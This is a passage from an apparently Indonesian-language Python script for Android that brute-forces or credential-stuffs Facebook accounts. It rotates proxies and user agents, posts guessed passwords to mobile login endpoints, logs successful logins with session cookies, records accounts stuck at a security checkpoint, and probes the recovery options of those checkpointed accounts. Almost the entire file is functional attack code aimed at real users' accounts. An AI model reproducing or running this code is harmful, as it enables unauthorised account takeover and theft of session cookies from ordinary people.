			'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',])		
    nip=random.choice(prox)
    proxs= {'http': 'socks5://'+nip}
    ses=requests.Session()
    sys.stdout.write('\r%s[MKS] %s/%s ☣ OK:%s ☣ CP:%s ☣ %s%s%s ☣'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
    for pw in pwv:
        try:
			
            ua = random.choice(ugen)
            #secua=re.findall(' Chrome/(.*?)Mobile Safari/537.36',str(ua))[0].split('.')[0]
            head1={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-language': 'en-US,en;q=0.9',
'cache-control': 'max-age=0',
'referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&errorcode=1348092&next=https%3A%2F%2Ffree.facebook.com%2Flogin%2Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="103", "Google Chrome";v="103"',
'sec-ch-ua-mobile': '?1',
'sec-ch-ua-platform': '"SAMSUNG"',
'sec-fetch-dest': 'document',
'sec-fetch-mode': 'navigate',
'sec-fetch-site': 'same-origin',
'sec-fetch-user': '?1',
'upgrade-insecure-requests': '1',
'user-agent': uaku2}
            p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&errorcode=1348092&next=https%3A%2F%2Ffree.facebook.com%2Flogin%2Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr',headers=head1)
            readable = str(time.time()).split('.')[0]
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"next=https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass": pw}
            head2={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'x-requested-with': 'mark.via.gp',
'cache-control': 'max-age=0',
'content-length': '72',
'content-type': 'application/x-www-form-urlencoded',
'origin': 'https://free.facebook.com',
'referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&errorcode=1348092&next=https%3A%2F%2Ffree.facebook.com%2Flogin%2Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr',
'sec-fetch-dest': 'document',
'sec-fetch-mode': 'navigate',
'sec-fetch-site': 'same-origin',
'sec-fetch-user': '?1',
'upgrade-insecure-requests': '1',
'user-agent': ua}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},allow_redirects=False,headers=head2,proxies=proxs)
            if "checkpoint" in po.cookies.get_dict().keys():
                if 'ya' in oprek:
                    open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                    cp+=1
                    idfs=idf
                    pws=pw
                    cekopsii(idfs,pws)
                    break
                else:
                    cp+=1
                    print('\n')
                    statuscp = f'\r{K}[CP] {idf}|{pw}'
                    print(statuscp)
                    open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                break
            elif "c_user" in po.cookies.get_dict().keys():
                if 'no' in taplikasi:
                    ok+=1
                    headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
                    if 'no' in taplikasi:
                        coki=po.cookies.get_dict()
                        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                        open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                        print('\n')
                        statusok = f'{H}[OK] {idf}|{pw}\n[•] COOKIES  : {kuki}{C}\n'
                        print(statusok)
                        break
                else:
                    coki=po.cookies.get_dict()
                    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                    infoakun = ""
                    session = requests.Session()
                    cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
                    cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
                    infoakun += (f"\n(1) APLIKASI AKTIF : \n")
                    apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
                    nok=1
                    for muncul in apkaktif:
                        infoakun+= (f"    [{nok}] {muncul[0]} {muncul[1]}\n")
                        nok+=1

                    hit=0
                    infoakun += (f"\n(2) APLIKASI KEDALUWARSA:\n")
                    apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
                    hit=0
                    for muncul in apkexp:
                        hit+=1
                        infoakun += (f"    [{hit}] {muncul[0]} {muncul[1]}\n")
                    print('\n')
                    statusok = f'\r[OK] {idf}|{pw}|{kuki}\n{infoakun}'
                    ok+=1
                    break


            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(10)
    loop+=1


def cek_opsi():
    c = len(akun)
    hu = '  [C] Terdapat %s Akun Untuk Dicek\n  [C]Sebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
    print(hu)
    input(x+'['+h+'•'+x+'] Mulai')
    welcome=f'''
{H}PROSES CEK OPSI DIMULAI{C}
{CY}────────────────────────────────────────────────────────────'''
    print(welcome)
    love = 1
    for kes in akun:
        try:
            idfs,pws ,tl= kes.split('|')[0],kes.split('|')[1],kes.split('|')[2]
        except:
            idfs,pws= kes.split('|')[0],kes.split('|')[1]
            tl='-'
        print('\r[C] MENGECEK ID [ %s ] [ %s/%s]'%(idfs,love,len(akun)));sys.stdout.flush()
        cekopsii(idfs,pws,tl)
        love+=1
    welcome=f'''
{H}DONE{C}
{CY}────────────────────────────────────────────────────────────'''
    print(welcome)
    exit()
def cekopsii(id,pw):
    try:
        ua = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36'

        req=requests.Session()
        head={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="67", "Chromium";v="67"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/?locale=id_ID&_rdr','accept-language': 'en-US;q=0.8,en;q=0.7'}
        a=sop(req.get('https://mbasic.facebook.com/?locale=id_ID&_rdr').text,'html.parser')
        porm=a.find('form')
        dataa = {}
        lion = ['lsd','jazoest','m_ts','li','try_number','unrecognized_tries','email','pass','login','bi_xrwh']
        for anj in porm('input'):
            if anj.get('name') in lion:
                if 'pass' ==anj.get('name'):
                    dataa.update({anj.get('name'): pw})
                elif 'email' in anj.get('name'):
                    dataa.update({anj.get('name'): id})
                else:
                    dataa.update({anj.get('name'):anj.get('value')})
        b=sop(req.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&locale2=id_ID&refid=8',data=dataa,headers=head,allow_redirects=True).text,'html.parser')
        kuki = (";").join([ "%s=%s" % (key, value) for key, value in req.cookies.get_dict().items() ])
        coki=req.cookies.get_dict()
        if "checkpoint" in req.cookies.get_dict().keys():
            try:
                ampromm=b.find('form')
                amdat=['fb_dtsg','fb_dtsg','jazoest','jazoest','checkpoint_data=','submit[Continue]','nh']
                amdata={}
                for enj in ampromm('input'):
                    if enj.get('name') in amdat:
                        amdata.update({enj.get('name'):enj.get('value')})
                cc=req.post('https://mbasic.facebook.com/login/checkpoint/?locale2=id_ID', cookies=coki, headers=head,data=amdata).text
                c=sop(cc,'html.parser')
                opsi=c.find_all('option')
                no=1
                opsinya=''
                print('\r\n')
                for opsii in opsi:
                    opsinya+=f'	[{no}] {opsii.text} \n'
                    no+=1
                if opsinya=='':
                    open('TAP-YES/'+tpc,'a').write(id+'|'+pw+'\n')
                    welcome=f'''
{K}[TAP-YES]───────────────────────────────────────────────────'''
                    print(welcome)
                    statusok = f'{K}😣 ID       : {id}\n😣 SANDI    : {pw}\n😣 PILIHAN CEKPOIN     : TAP YES{C}'
                    print(statusok)
                else:
                    welcome=f'''
{K}[CHECKPOINT]────────────────────────────────────────────────'''
                    print(welcome)
                    statusok = f'\r{K}😣 ID       : {id}\n😣 SANDI    : {pw}\n😣 PILIHAN CEKPOIN     :\n {opsinya}{C}'
                    print(statusok)
            except:
                print('\n\r')
                welcome=f'''
{K}[CHECKPOINT]────────────────────────────────────────────────'''
                print(welcome)
                statusok = f'\r{K}😣 ID       : {id}\n😣 SANDI    : {pw}\n😣 PILIHAN CEKPOIN     : FAILED CEK OPSI{C}'
                print(statusok)
        
        
        elif "c_user" in req.cookies.get_dict().keys():
            print('\n\r')
            welcome=f'''
{H}[OK]────────────────────────────────────────────────────────'''
            print(welcome)
            open('OK/'+okc,'a').write(id+'|'+pw+kuki+'\n')
            statusok = f'\r{H}🤗 ID       : {id}\n🤗 SANDI    : {pw}\n🤗 PILIHAN CEKPOIN     : ACCOUNT OK{C}'
            print(statusok)
        else:
            print('\n\r')
            welcome=f'''
{M}[CHECKPOINT]────────────────────────────────────────────────'''
            print(welcome)
            statusok = f'\r{M}😣 ID : {id}😣 SANDI    : {pw}\n😣 PILIHAN CEKPOIN     : WRONG PASSWORD{C}'
            print(statusok)
    except requests.exceptions.ConnectionError:
        time.sleep(20)
        cekopsii(id, pw,)
def tipsx():
    print('PRANK...HAHA')
if __name__=='__main__':
    try:os.mkdir('/sdcard/MAN-DATA/CP')
    except:pass
    try:os.mkdir('/sdcard/MAN-DATA/OK')
    except:pass
    try:os.mkdir('/sdcard/MAN-DATA/DUMP')
    except:pass
    login()